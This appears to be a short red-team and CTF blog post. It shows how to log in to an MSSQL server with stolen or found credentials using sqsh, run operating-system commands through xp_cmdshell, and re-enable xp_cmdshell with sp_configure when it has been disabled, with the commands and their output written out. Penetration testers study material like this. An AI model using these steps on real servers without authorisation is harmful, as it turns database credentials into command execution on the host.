---
layout: post
title:  "Use MSSQL To Execute System Commands"
date:   2020-03-12 01:41:34 +0530
categories: redteam ctf
---

## Introduction

When we conducting a penetration test, the end goal of the reconnaissance phase is finding a way to execute a system command. If your system have a 
MSSQL database and you have found credentials to it congratulations you have found a way to execute system command. This blog post talks about 
how to execute system commands using MSSQL.

## Login to MSSQL database
We can use a tool called sqsh to login to the database
```
sqsh -S <IP> -U <USER> -P <PASS>
```

## Execute system commands
xp_cmdshell function can be use to execute system commands,
```
1>xp_cmdshell 'whoami'
2>go
```

## xp_cmdshell is disabled?
If xp_cmdshell function is disabled as a security configuration still there is a way to enable it <b>IF</b> you are an admin user or sa user in MSSQL
```
1> EXEC sp_configure 'show advanced options', 1;
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE
statement to install.
(return status = 0)
1> RECONFIGURE; 
2> go
1> EXEC sp_configure 'xp_cmdshell', 1;
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to
install.
(return status = 0)
1> RECONFIGURE;
2> go
```

### Happy Hacking !!!
